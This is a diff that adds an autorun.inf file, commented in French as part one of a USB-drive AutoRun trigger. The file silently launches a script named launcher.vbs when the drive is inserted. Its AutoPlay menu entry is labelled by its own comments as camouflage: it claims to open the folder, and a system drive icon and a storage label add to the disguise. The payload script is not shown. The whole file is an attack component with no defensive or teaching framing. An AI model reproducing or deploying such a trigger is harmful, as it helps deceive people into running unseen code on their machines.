@@ -1,0 +1,14 @@
+; ============================================================
+; autorun.inf – Déclencheur AutoRun pour clé USB (Partie 1)
+; Fonctionne sur les systèmes Windows où AutoRun est activé
+; (Windows XP/7 par défaut, ou Windows 10/11 avec GPO)
+; ============================================================
+[autorun]
+; Lance le script VBS de façon silencieuse dès l'insertion
+open=launcher.vbs
+shellexecute=launcher.vbs
+; Commande affichée dans le menu AutoPlay (camouflage)
+action=Ouvrir le dossier pour afficher les fichiers
+; Icône du lecteur dans l'Explorateur (icône système standard)
+icon=shell32.dll,8
+label=USB Stockage
